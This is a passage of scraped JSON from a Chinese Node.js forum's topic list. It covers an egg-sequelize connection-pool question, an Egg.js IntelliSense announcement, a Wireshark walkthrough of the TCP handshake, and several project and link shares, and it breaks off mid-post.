(&#x2F;srv&#x2F;www&#x2F;vhosts&#x2F;Needs_Dccs&#x2F;node_modules&#x2F;generic-pool&#x2F;lib&#x2F;ResourceRequest.js:62:17)\n    at Timeout.bound (&#x2F;srv&#x2F;www&#x2F;vhosts&#x2F;Needs_Dccs&#x2F;node_modules&#x2F;generic-pool&#x2F;lib&#x2F;ResourceRequest.js:8:15)\n    at ontimeout (timers.js:427:11)\n    at tryOnTimeout (timers.js:289:5)\n    at listOnTimeout (timers.js:252:5)\n    at Timer.processTimers (timers.js:212:10)\nname: &quot;TimeoutError&quot;\n</code></pre><pre class=\"prettyprint\"><code>sequelize: {\n            dialect: &#x27;mysql&#x27;,\n            database: &#x27;database&#x27;,\n            username: &#x27;root&#x27;,\n            password: &#x27;password&#x27;,\n            timezone: &#x27;+08:00&#x27;,\n            host: &#x27;127.0.0.1&#x27;,\n            port: &#x27;3306&#x27;,\n            loggerLevel: &#x27;debug&#x27;,\n            dialectOptions: {\n                supportBigNumbers: true,\n                bigNumberStrings: true\n            },\n            define: {\n                freezeTableName: true,\n                charset: &#x27;utf8&#x27;,\n                dialectOptions: {\n                    collate: &#x27;utf8_general_ci&#x27;\n                },\n                timestamps: false\n            },\n            pool: {\n                max: 5,\n                min: 0,\n                acquire: 30000,\n                idle: 10000\n            }\n        },\n</code></pre></div>","title":"egg-sequelize连接池不能释放问题","last_reply_at":"2019-04-01T03:51:56.244Z","good":false,"top":false,"reply_count":2,"visit_count":1350,"create_at":"2018-10-25T01:31:58.696Z","author":{"loginname":"zhangmingfeng","avatar_url":"https://avatars1.githubusercontent.com/u/16733816?v=4&s=120"}},{"id":"5ca183e7484eeb3634158eea","author_id":"5c9cd34d99e62a362ff40e45","tab":"ask","content":"<div class=\"markdown-text\"><p>可以把node.js得内置模块得源码下载到本地后运行吗</p>\n</div>","title":"node.js cluster模块","last_reply_at":"2019-04-01T03:22:15.162Z","good":false,"top":false,"reply_count":0,"visit_count":369,"create_at":"2019-04-01T03:22:15.162Z","author":{"loginname":"Linezy","avatar_url":"https://avatars3.githubusercontent.com/u/35105473?v=4&s=120"}},{"id":"5ca178be484eeb3634158e69","author_id":"53b25565399ed9e07d1e8793","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>仿 teambition 使用 koa 开发的一个无刷新的任务管理系统，当然功能没有人家teambition多了，不过我觉得用的最多的也就这些功能了</p>\n</blockquote>\n<p>开源地址：<a href=\"https://github.com/tomoya92/pyteam\">https://github.com/tomoya92/pyteam</a>\n体验地址：<a href=\"https://team.yiiu.co/\">https://team.yiiu.co/</a></p>\n<h2>技术栈</h2>\n<ul>\n<li>koa2</li>\n<li>jquery-pjax</li>\n<li>bootstrap3</li>\n<li>sequelize(mysql)</li>\n<li><a href=\"http://socket.io\">socket.io</a></li>\n<li>nunjucks</li>\n</ul>\n<h2>启动</h2>\n<blockquote>\n<p>我的开发环境：nodejs(v11) + mysql(v5.7)</p>\n</blockquote>\n<ol>\n<li>创建数据库 <code>pyteam</code> , <strong>不用创建表</strong> 启动时自动就创建表了</li>\n<li>修改<code>config.js</code>里的配置信息，<code>base_url</code> 和 <code>mysql</code> 就够了</li>\n</ol>\n<p>安装项目依赖</p>\n<pre class=\"prettyprint language-bash\"><code>npm install\nnpm install -g nodemon\n</code></pre><p>启动项目</p>\n<pre class=\"prettyprint language-bash\"><code>npm run dev\n</code></pre><p>部署正式环境</p>\n<pre class=\"prettyprint language-bash\"><code>npm install -g pm2\npm2 start process.yml\n</code></pre><p>正式环境重启</p>\n<pre class=\"prettyprint language-bash\"><code>pm2 restart pyteam\n</code></pre><p>服务端口号 3002</p>\n<h2>功能&amp;特色</h2>\n<ul>\n<li>项目管理</li>\n<li>项目下任务管理</li>\n<li>接口文档管理</li>\n</ul>\n<p>如果页面内容状态有变动，自己不用刷新页面就可以实时更新，详细可见动图</p>\n<p><img src=\"https://github.com/tomoya92/pyteam/blob/master/screenshot/create-project.gif?raw=true\" alt></p>\n<p><img src=\"https://github.com/tomoya92/pyteam/blob/master/screenshot/task.gif?raw=true\" alt></p>\n<p><img src=\"https://github.com/tomoya92/pyteam/blob/master/screenshot/chatroom.gif?raw=true\" alt></p>\n<h2>使用场景</h2>\n<p>内网使用，外网碰到的问题请自行解决</p>\n<h2>使用方法</h2>\n<p>项目部署好之后，注册一个用户名为admin的用户，默认admin为管理员（当然也可以自行配置管理员用户，找到<code>config.js</code>文件，在数组<code>admins</code>里添加用户名即可），可以进入后台</p>\n<p>进入后台之后，首先添加部门</p>\n<p>其它用户注册就可以选择自己是哪个部门的了，这样在登录之后就可以看见自己部门下的所有项目了，如果不选择部门的话，是没办法创建项目的，首页也不会有任何项目</p>\n<hr>\n<p>觉得不错的，赏个star呗 : )</p>\n</div>","title":"分享一个个人开发的任务管理系统，使用 pjax+socket.io 实现的功能，体验棒棒哒~","last_reply_at":"2019-04-01T02:34:38.439Z","good":false,"top":false,"reply_count":0,"visit_count":620,"create_at":"2019-04-01T02:34:38.439Z","author":{"loginname":"tomoya92","avatar_url":"https://avatars2.githubusercontent.com/u/6915570?v=4&s=120"}},{"id":"5c6657630752e020af943d12","author_id":"4f447c2f0a8abae26e01b27d","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>原文地址，知乎专栏： <a href=\"https://zhuanlan.zhihu.com/p/56780733\">https://zhuanlan.zhihu.com/p/56780733</a></p>\n</blockquote>\n<h2>先睹为快</h2>\n<p>感受下在 JS 下也能 <code>智能提示</code> 和 <code>点击跳转</code> 的 Feeling~</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/84182/1550199849857-33990e86-85e0-4275-9cbf-c05ad050534b.gif#align=left&amp;display=inline&amp;height=404&amp;linkTarget=_blank&amp;name=js-dts.gif&amp;originHeight=444&amp;originWidth=819&amp;size=650168&amp;width=746\" alt=\"js-dts.gif\"></p>\n<p><strong>Try it out!</strong></p>\n<pre class=\"prettyprint language-bash\"><code># 通过骨架初始化\n$ mkdir showcase &amp;&amp; cd showcase\n$ npm init egg --type=simple\n\n# 安装依赖，并启动\n$ npm i --no-package-lock\n$ npm run dev\n</code></pre><h2>背景</h2>\n<p><code>VSCode</code> 等 IDE 的智能提示，一般是通过静态分析来实现的。</p>\n<p>因此，它们对 Egg 的支持并不是很好，因为 Egg 是通过 Loader 动态挂载的。</p>\n<p>幸好，<strong>Egg 团队依旧一如既往的关注研发体验。</strong> 在不懈的努力研究下，We made it!</p>\n<p>我们此前已经支持了 TS：<a href=\"https://zhuanlan.zhihu.com/p/35334932\">『当 Egg 遇到 TypeScript，收获茶叶蛋一枚』</a>。\n而这次，我们对 JS 的项目，也提供了类似的支持，保持一致的研发体验。</p>\n<h2>写在展开之前</h2>\n<p>尽管我们对 JS 和 TS 的 Egg 项目，都支持了智能提示和跳转的支持。</p>\n<p>但我们还是期望你能对它保持一个理性的认知：</p>\n<blockquote>\n<p>Egg 研发委提示您：\n<strong>代码千万行，测试要写完。</strong>\n<strong>提示不过脑，上线泪两行。</strong></p>\n</blockquote>\n<p><strong>请务必提醒自己：智能提示仅仅是锦上添花，而不是不可或缺的。</strong></p>\n<p><strong>对于业务而言，TS 并不是银弹，完善的单元测试覆盖，严谨的 Code Review 流程更重要。</strong></p>\n<p><strong>测试都覆盖不全，就别来跟我们聊什么企业应用、质量保障、架构啥的了。</strong></p>\n<h2>解决思路</h2>\n<p>主要思路其实非常简单，无非就是：</p>\n<p><strong>动态生成<code>d.ts</code> ，使用 TypeScript 的 <a href=\"https://www.typescriptlang.org/docs/handbook/declaration-merging.html\">Declaration Merging</a> 特性，并读取 JSDoc 注释。</strong></p>\n<p><a href=\"https://github.com/whxaxes/egg-ts-helper\">egg-ts-helper</a> 已经对 TS 和 JS 都提供了同样的支持，并内置到 egg-bin 中。</p>\n<p><strong>需要注意的是，为了更好的体验，开发者需要完善应用本身的 JSDoc 。</strong></p>\n<h2>旧项目升级</h2>\n<p>非常简单，只需要几步：</p>\n<ul>\n<li>删除 <code>node_modules</code> 重新安装依赖（<strong>不要锁版本</strong>），升级到最新的 <code>egg-bin</code> 。</li>\n<li>修改 <code>package.json</code> 添加 <code>&quot;egg&quot;: { &quot;declarations&quot;: true }</code> 。</li>\n<li>启动应用 <code>npm run dev</code>\n<ul>\n<li><code>egg-bin</code> 会自动生成对应的 <code>d.ts</code> 。</li>\n<li>如果无法提示，可能是 <code>VSCode</code> 缓存，需重启一次。</li>\n</ul>\n</li>\n<li>开始体验吧！</li>\n</ul>\n<h2>注意事项</h2>\n<p>整体体验，限于语言特性，并不敢说尽善尽美，但至少解决了有无问题，大部分的体验还 OK。</p>\n<blockquote>\n<p>Egg 研发委提示您：</p>\n<p>代码千万行，测试要写完。\n提示不过脑，上线泪两行。</p>\n</blockquote>\n<h3><code>Router</code></h3>\n<p>需增加 <code>JSDoc</code> 定义：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; app&#x2F;router.js\n\n&#x2F;**\n * @param {Egg.Application} app - egg application\n *&#x2F;\nmodule.exports = app =&gt; {\n  const { router, controller } = app;\n  router.get(&#x27;&#x2F;&#x27;, app.middleware.access(), controller.home.index);\n};\n</code></pre><h3><code>Config</code></h3>\n<p>格式需修改如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; config&#x2F;config.default.js\n\n&#x2F;**\n * @param {Egg.EggAppInfo} appInfo\n *&#x2F;\nmodule.exports = appInfo =&gt; {\n  &#x2F;**\n   * 框架内置配置\n   * @type {Egg.EggAppConfig}\n   *&#x2F;\n  const config = {};\n  config.keys = appInfo.name + &#x27;_1543991101115_6311&#x27;;\n  config.middleware = [];\n\n  &#x2F;**\n   * 自定义配置\n   *&#x2F;\n  const userConfig = {\n    query: {\n      &#x2F;**\n       * default query count\n       *&#x2F;\n      limit: 10,\n    },\n    biz: {\n      test: &#x27;123&#x27;,\n    },\n  };\n\n  return {\n    ...config,\n    ...userConfig,\n  };\n};\n\n</code></pre><h3><code>Service</code></h3>\n<p>主要是 <code>JSDoc</code> ：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; app&#x2F;service&#x2F;user.js\n\nconst { Service } = require(&#x27;egg&#x27;);\n\nclass UserService extends Service {\n  &#x2F;**\n   * @typedef {Object} User - user class\n   * @property {String} name - name\n   *&#x2F;\n\n  &#x2F;**\n   * list users with filter\n   * @param {String} [keyword] - user name filter\n   * @param {Number} [limit] - fetch count\n   * @return {Array&lt;User&gt;} return required users\n   *&#x2F;\n  async list(keyword, limit) {\n    return [].filter(item =&gt; item.name.includes(keyword)).slice(limit);\n  }\n}\n\nmodule.exports = UserService;\n</code></pre><h3>Plugin</h3>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; config&#x2F;plugin.js\n\n&#x2F;** @type Egg.EggPlugin *&#x2F;\nmodule.exports = {\n  nunjucks: {\n    enable: true,\n    package: &#x27;egg-view-nunjucks&#x27;,\n  }\n};\n</code></pre><h2>写在最后</h2>\n<p>我们依旧一如既往的关注研发体验，后续会有更多优化。</p>\n<blockquote>\n<p>预告：春节期间，我们闭关把文档重新梳理了信息架构，精简合并了不少内容，从用户角度去重新阐述。\n不过由于工作量较大，还需要耐心等待。</p>\n</blockquote>\n</div>","title":"Egg 支持 JS 智能提示","last_reply_at":"2019-04-01T02:24:08.938Z","good":true,"top":false,"reply_count":12,"visit_count":2045,"create_at":"2019-02-15T06:08:35.529Z","author":{"loginname":"atian25","avatar_url":"https://avatars2.githubusercontent.com/u/227713?v=4&s=120"}},{"id":"5ca0e146484eeb3634158d23","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35a98ffb2?w=640&amp;h=426&amp;f=png&amp;s=482584\" alt=\"20190331104134.png\"></p>\n<blockquote>\n<p>⭐️ 更多前端技术和知识点，搜索订阅号 <code>JS 菌</code> 订阅</p>\n</blockquote>\n<p>HTTP 协议是基于 TCP 协议的。大家都知道发送 HTTP 报文需要首先建立客户端和服务端之间的 TCP 连接。TCP 三次握手建立连接，四次挥手断开连接，再熟悉不过。本文实践一下 TCP 建立和断开的整个流程，并通过抓包工具进行逐一分析。</p>\n<p>开始之前呢，先安装抓包工具，这里用的是 <code>Wireshark</code> 正常下载安装，不再赘述</p>\n<p>然后我们还需要 <code>curl</code> 如果在 windows 中没有这个模块，可以通过 <code>Chocolatey</code> 去安装，或者用 <code>wget</code>、浏览器啥的</p>\n<p>两个准备工作做好了，就可以开始分析工作了。</p>\n<h2>TCP 建立连接</h2>\n<p>首先回顾一下 HTTP 请求是怎么发送的：</p>\n<ul>\n<li>先是建立 TCP 连接\n<ul>\n<li>首先，服务端准备接收客户端请求，状态变为 <code>LISTEN</code>；客户端发送建立连接请求包，携带一个 <code>SYN</code>，<code>Seq=x</code>；此时客户端状态为 <code>SYN_SENT</code> 状态</li>\n<li>服务端收到请求后，同意连接返回一个同意连接的包，携带一个 <code>SYN，ACK</code>，<code>Seq=y</code>，<code>Ack=x+1</code>；服务端状态变为 <code>SYN_RCVD</code></li>\n<li>客户端收到确认后，还要发送一个确认的确认连接包，携带一个 <code>ACK</code>，<code>Ack=y+1</code>；服务端收到后，客户端服务端都为 <code>ESTABLISHED</code> 状态；连接建立成功</li>\n</ul>\n</li>\n<li>客户端发送 HTTP 请求\n<ul>\n<li>组装 HTTP 请求行、请求首部和实体</li>\n</ul>\n</li>\n</ul>\n<p>⚠️ 一定要注意 ACK 和 Ack 是不同的概念，前者是 <code>Acknowledgement</code> 确认值，后者是 <code>Acknowledgement Number</code> 确认编号</p>\n<p>开始抓包：</p>\n<p>打开 Wireshark，左上角鲨鱼鳍标志，然后在终端中使用 curl 给发送一个 GET 请求，这里以 <a href=\"http://httpbin.org/json\">http://httpbin.org/json</a> 为例</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35a885e60?w=834&amp;h=752&amp;f=png&amp;s=76547\" alt=\"20190331223151.png\"></p>\n<p>回到 Wireshark，在过滤器中输入 http，只查看 http 应用层的信息：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35a6c6e70?w=1966&amp;h=944&amp;f=png&amp;s=395148\" alt=\"20190331223300.png\"></p>\n<p>然后我们选择明显是 <code>/json</code> 网址的记录，右键选择 follow 子菜单中的 HTTP Stream：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35aa676f8?w=1852&amp;h=1256&amp;f=png&amp;s=240867\" alt=\"20190331223430.png\"></p>\n<p>弹出的窗口是 HTTP 请求报文，先关闭窗口暂时用不到这些东西</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35aaeb737?w=2784&amp;h=384&amp;f=png&amp;s=244744\" alt=\"20190331121320.png\"></p>\n<p>此时面板中就是整个 TCP 建立、发送 HTTP 请求并获取响应以及断开 TCP 连接的过程</p>\n<p><strong>客户端发送请求建立连接</strong></p>\n<p>第一条记录显示了我的电脑端口发送了一个 TCP 连接的包，这个包携带了一个 SYN flag，Seq 被设置为 0；这就是请求建立 TCP 连接的包</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a35facfa7c?w=1964&amp;h=1328&amp;f=png&amp;s=390672\" alt=\"20190331224046.png\"></p>\n<p>所以客户端请求建立 TCP 连接时是发送 SYN 的包，其中 Seq 被设置为 0（实际上有可能不为 0）</p>\n<p><strong>服务端返回确认信息</strong></p>\n<p>第二条是第一条包的确认信息：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39c65b82d?w=2030&amp;h=1296&amp;f=png&amp;s=404243\" alt=\"20190331224337.png\"></p>\n<p>看到这是一个确认包，这里的 flag 是 SYN 和 ACK，其中 Seq 为新设置的值为 0（ ⚠️ 注意这里的 Seq 与此前发送的 Seq 不是一个值）</p>\n<p>另外确认序号 Ack 是之前为 0 的，接收到的那个序号 Seq + 1，值为 1</p>\n<p><strong>客户端发送确认信息</strong></p>\n<p>第三条就是第二条包的确认信息，表示确认收到服务端的确认信息</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39cc193d4?w=2002&amp;h=1322&amp;f=png&amp;s=397781\" alt=\"20190331224714.png\"></p>\n<p>第三个包可以看到有一个 ACK，同时序号 Seq 为第一次发送请求建立连接时候的 Seq + 1，值为 1（ ⚠️ 注意这里的 Seq 与服务端返回的 Seq 不是一个值），Ack 确认序号就是收到的服务端发送的包 Seq + 1，值为 1</p>\n<p>至此 TCP 连接成功</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39d801b56?w=1508&amp;h=1174&amp;f=png&amp;s=145213\" alt=\"20190331201124.png\"></p>\n<p>⚠️ 一定要注意区别开双方发送的 Seq 不是一个东西，Ack 是确认收到对方的包，在对方发送的这个包的 Seq 基础上增加 1。自己发送接下来的包，则是在自己发送的上一个包的 Seq 基础上增加 1；另外还要区别 Ack 和 ACK 是不同的；</p>\n<h2>TCP 断开连接</h2>\n<p>客户端主动断开 TCP 连接的过程如下：</p>\n<ul>\n<li>客户端发送断开连接的请求包，携带一个 <code>FIN, ACK</code>，<code>Seq=x</code>，<code>Ack=y</code>；此时客户端状态为 <code>FIN_WAIT_1</code></li>\n<li>服务端同意断开连接，返回一个 <code>ACK</code>，<code>Ack=x+1</code>;服务端可能还有数据需要传送，继续传送并将状态变为 <code>CLOSE_WAIT</code> 状态；客户端收到并将状态变为 <code>FIN_WAIT_2</code>；继续接收数据。</li>\n<li>数据传输完毕，服务端发送一个 <code>FIN</code>，<code>Seq=z+1</code>(这里的 z 是最后一次服务端发送的 Seq 序号)；服务端状态变为 <code>LAST_ACK</code>；客户端收到并将状态变为 <code>TIME_WAIT</code></li>\n<li>数据接收到之后，客户端发送一个 <code>ACK</code>，这里的 <code>Ack=z+2</code>（就是最后一次接收到的序号 Seq 加一）</li>\n</ul>\n<p>Wireshark 抓包记录继续分析：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39d9c3eff?w=2242&amp;h=980&amp;f=png&amp;s=301738\" alt=\"20190331232257.png\"></p>\n<p>首先客户端发送一个 FIN, ACK，切序号 Seq 为 80，Ack 为 650，请求断开连接</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39da5c00a?w=2142&amp;h=946&amp;f=png&amp;s=279856\" alt=\"20190331232646.png\"></p>\n<p>服务端返回一个 ACK 和一个 FIN，因为没有更多数据传输，所以原本两个数据包被合并成一个，因此这里四次挥手因合并而变为“三次挥手”</p>\n<p>这里的 Seq 为 650，确认序号 Ack 为收到序号加一也就是 80 + 1 = 81</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/31/169d46a39ed6573f?w=1974&amp;h=930&amp;f=png&amp;s=252388\" alt=\"20190331233025.png\"></p>\n<p>最后客户端发送一个 ACK，就代表 TCP 连接正式断开，Ack 为收到序号加一也就是 650 + 1 = 651</p>\n<p>整个 TCP 通信过程就是这样</p>\n<p>⚠️ Seq 序号和 Ack 确认序号比较乱；这里提个醒 Ack 始终为最后收到包的序号 Seq + 1；而 Seq 则是上一个发送出去的包的 Seq + 1</p>\n<blockquote>\n<p>有哪里有讲的不准确的地方也请指正谢谢</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/29/169c8b7d668e008f?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt=\"JS 菌公众账号\"></p>\n<p>请关注我的订阅号，不定期推送有关 JS 的技术文章，只谈技术不谈八卦 😊</p>\n</div>","title":"🔗 抓包分析 TCP 建立和断开连接的流程","last_reply_at":"2019-03-31T15:48:22.496Z","good":false,"top":false,"reply_count":0,"visit_count":373,"create_at":"2019-03-31T15:48:22.496Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c983c8700bcfd7eb2be5a8a","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://unsplash.it/1132/619?random\" alt=\"image\"></p>\n<p>preact源码解析，因为preact貌似用ts重构了，所以我在网上查的文章很多都有些过时了。我自己一行行阅读源码，写的文章，我水平比较菜，说的可能不对。我也比较笨写的也不是很好，还在更新中，大家可以看看，指出缺点</p>\n<p>preact源码分析</p>\n<p><a href=\"https://juejin.im/post/5c97599fe51d450f357634fc\">https://juejin.im/post/5c97599fe51d450f357634fc</a></p>\n<p><a href=\"https://juejin.im/post/5c9759cef265da611256430c\">https://juejin.im/post/5c9759cef265da611256430c</a></p>\n<p><a href=\"https://juejin.im/post/5c975a1e6fb9a07107193af1\">https://juejin.im/post/5c975a1e6fb9a07107193af1</a></p>\n</div>","title":"preact源码分享～～～～～～～～完结～～～～～～～～～","last_reply_at":"2019-03-31T11:46:09.746Z","good":false,"top":false,"reply_count":2,"visit_count":786,"create_at":"2019-03-25T02:27:19.260Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5ca099d999e62a362ff41a09","author_id":"554c4241ba6070b06ac28de5","tab":"ask","content":"<div class=\"markdown-text\"><p>就像 Firefox：\n<img src=\"//static.cnodejs.org/FpQyAoUtVfWtJLgbPRMYhiocoQAX\" alt=\"Screen Shot 2019-03-31 at 18.18.50.png\"></p>\n<p>我关心的是我的代码哪里有问题，极少数情况才会去查看第三方库的问题</p>\n<p>谢谢</p>\n</div>","title":"有没有在错误栈中折叠第三方库部分的工具","last_reply_at":"2019-03-31T10:43:37.930Z","good":false,"top":false,"reply_count":0,"visit_count":438,"create_at":"2019-03-31T10:43:37.930Z","author":{"loginname":"mantou132","avatar_url":"https://avatars3.githubusercontent.com/u/3841872?v=4&s=120"}},{"id":"5c9ee97099e62a362ff4166b","author_id":"59302f441e7e75f60c1ad854","tab":"share","content":"<div class=\"markdown-text\"><p>前端开发知识整理分享, 👏👏欢迎来喷，不被喷就不知道自己的问题</p>\n<p><a href=\"https://github.com/AttemptWeb/Record\">github 项目仓库原址</a></p>\n<h2><img src=\"https://raw.githubusercontent.com/AttemptWeb/Record/master/Img/record1.png\" alt></h2>\n<p><img src=\"https://img.shields.io/badge/build-passing-brightgreen.svg\" alt=\"passing\"> <img src=\"https://img.shields.io/badge/License-MIT-brightgreen.svg\" alt=\"MIT\"></p>\n<p><strong>不是技术的创造者，只是技术的搬运工。有疑问欢迎issues</strong></p>\n<hr>\n<p>推荐 <a href=\"https://coolshell.cn/articles/10804.html\">X-Y Problem 问题</a></p>\n<h2>Problem</h2>\n<ul>\n<li><a href=\"https://github.com/EastSummer/wheel_marking/blob/master/question.md\"><strong>【Github】</strong> 一些面试问题的集合</a></li>\n<li><a href=\"https://github.com/HerryLo/Record/blob/master/js/JsMd/%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98.md\"><strong>【Markdown】</strong> 前端面试题持续更新中</a></li>\n<li><a href=\"https://github.com/mqyqingfeng/Blog\"><strong>【冴羽博客强推】</strong> JavaScript深入系列、JavaScript专题系列、ES6系列</a></li>\n<li><a href=\"https://github.com/ElemeFE/node-interview/tree/master/sections/zh-cn\"><strong>【Github】</strong> 饿了么 Node.js 面试</a></li>\n<li><a href=\"https://blog.csdn.net/column/details/webgl.html?&amp;page=2\"><strong>【文章】</strong> webGL的学习之路</a></li>\n<li><a href=\"https://coolshell.cn/articles/10804.html\"><strong>【文章】</strong> X-Y Problem 问题</a></li>\n<li><a href=\"https://www.cnblogs.com/kidney/p/6052935.html?utm_source=gold_browser_extension\"><strong>【文章】</strong> vue 的双向绑定</a></li>\n<li><a href=\"https://github.com/AttemptWeb/Record/blob/master/other/%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B.md\"><strong>【Markdown】</strong> 康威定律</a></li>\n<li><a href=\"https://juejin.im/post/5c22f13b5188252b56273a00\"><strong>【掘金】</strong> 闭包的错误使用</a></li>\n<li><a href=\"https://juejin.im/post/5983dfbcf265da3e2f7f32de\"><strong>【掘金】</strong> react@15.0 源码解析</a></li>\n<li><a href=\"https://i5ting.github.io/modern-nodejs/\"><strong>【Github】</strong> 现代的Node.js 构建服务利器</a></li>\n</ul>\n<h2>Portal</h2>\n<ul>\n<li>\n<p><a href=\"https://github.com/AttemptWeb/Record/tree/master/css\"><strong>【Markdown】</strong> css 传送</a></p>\n<blockquote>\n<p>随着css功能的不断强大，它可以做的东西也越来越多</p>\n</blockquote>\n</li>\n<li>\n<p><a href=\"https://github.com/AttemptWeb/Record/tree/master/js\"><strong>【Markdown】</strong> javascript 传送</a></p>\n<blockquote>\n<p>ECMS规范被现代浏览器所遵从，随着新特性的增加,语法糖的扩展不断加大，但基础知识依然没有变化</p>\n</blockquote>\n</li>\n<li>\n<p><a href=\"https://github.com/AttemptWeb/Record/tree/master/frame\"><strong>【Markdown】</strong> reactjs 传送</a></p>\n</li>\n</ul>\n<blockquote>\n<p>前端框架可以加快开发的速度，组件化、模块化便于多人团队协同开发</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/AttemptWeb/Record/tree/master/other/wxsapp\"><strong>【Markdown】</strong> 小程序开发 传送</a></li>\n</ul>\n<blockquote>\n<p>官方微信小程序对于API的开发，让前端开发者易于上手，但在一些问题面前无法得到好的解决</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/AttemptWeb/Record/tree/master/other/devTooll\"><strong>【Markdown】</strong> 工具扩展 传送</a></li>\n</ul>\n<blockquote>\n<p>开发对于git、webpack、Travis CI需要有一定的了解</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/AttemptWeb/Record/tree/master/server\"><strong>【Markdown】</strong> server扩展 传送</a></li>\n</ul>\n<blockquote>\n<p>对于基本的前端知识的掌握外，服务端的了解，也可以增加前端技术开发的筹码</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/AttemptWeb/Record/tree/master/other/learn\"><strong>【Markdown】</strong> 学习资料 传送</a></li>\n</ul>\n<blockquote>\n<p>将平时学习的资料放在这里</p>\n</blockquote>\n<h2>Project example</h2>\n<blockquote>\n<p>说明: 都是别人的项目，只是放个链接</p>\n</blockquote>\n<ul>\n<li>\n<p><a href=\"https://github.com/bailicangdu/vue2-elm\">基于 vue2 + vuex 构建一个具有 45 个页面的大型单页面应用</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/bailicangdu/node-elm\">基于 node.js + Mongodb 构建电商后台系统</a></p>\n</li>\n<li>\n<p><a href=\"https://pan.baidu.com/s/1geQIWHt?qq-pf-to=pcqq.group&amp;errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0#list/path=%2FVue%202.0%20%E9%AB%98%E7%BA%A7%E5%AE%9E%E6%88%98-%E5%BC%80%E5%8F%91%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%9F%B3%E4%B9%90WebApp\">Vue 2.0 高级实战-开发移动端音乐WebApp 百度云视频地址</a></p>\n</li>\n<li>\n<p><a href=\"https://pro.ant.design/\">开箱即用的中台前端/设计解决方案 ANT DESIGN PRO</a></p>\n</li>\n</ul>\n<h2>License</h2>\n<p><a href=\"https://github.com/HerryLo/Record/blob/master/LICENSE\">MIT</a></p>\n<h2>github 项目仓库</h2>\n<p><a href=\"https://github.com/AttemptWeb/Record\">github 项目仓库原址</a></p>\n</div>","title":"github的分享仓库 Record","last_reply_at":"2019-03-30T18:03:56.746Z","good":false,"top":false,"reply_count":2,"visit_count":402,"create_at":"2019-03-30T03:58:40.046Z","author":{"loginname":"lh199507","avatar_url":"https://avatars2.githubusercontent.com/u/20215975?v=4&s=120"}},{"id":"5c9d958c99e62a362ff4109a","author_id":"5b8f4cb682f0728f354d741b","tab":"ask","content":"<div class=\"markdown-text\"><p>最近刚刚试用了egg做了一个项目，但是在service中使用egg-sequelize的事务时遇到了一些问题\n如果一个有事务的service调用了另一个有事务的service，如何才能优雅的传递事务？之前是再service中预留了事务这个参数，\n但这样写代码真的是太丑了，有没有什么好的办法？\n另外，关于controller与service与Dao之间的界限，一直不能很好的区别开\n如：关于session的操作，是在controller中进行，还是service？service与controller都可以访问ctx，这让我在使用时分不清两者的界限\n又如：controller对于service返回的结果，是否还需要校验？如果service中出现了参数不正确，如何才能让controller获知？\n恳请各位看看在下的问题</p>\n</div>","title":"关于在egg中带有事务的service之间的调用","last_reply_at":"2019-03-30T12:06:49.088Z","good":false,"top":false,"reply_count":3,"visit_count":429,"create_at":"2019-03-29T03:48:28.247Z","author":{"loginname":"M1178475702","avatar_url":"https://avatars3.githubusercontent.com/u/42426867?v=4&s=120"}},{"id":"5c9f55f499e62a362ff41799","author_id":"5b31b09b57137f22415c4f4a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>该文章阅读需要7分钟,更多文章请点击本人博客<a href=\"https://www.halu886.cn\">halu886</a></strong></p>\n</blockquote>\n<ul>\n<li><a href=\"#%E5%BC%82%E6%AD%A5io%E4%B8%8E%E9%9D%9E%E9%98%BB%E5%A1%9Eio\">异步I/O与非阻塞I/O</a>\n<ul>\n<li><a href=\"#read\">read</a></li>\n<li><a href=\"#select\">select</a></li>\n<li><a href=\"#poll\">poll</a></li>\n<li><a href=\"#epoll\">epoll</a></li>\n<li><a href=\"#kqueue\">kqueue</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%90%86%E6%83%B3%E7%9A%84%E9%9D%9E%E9%98%BB%E5%A1%9E%E5%BC%82%E6%AD%A5io\">理想的非阻塞异步I/O</a></li>\n<li><a 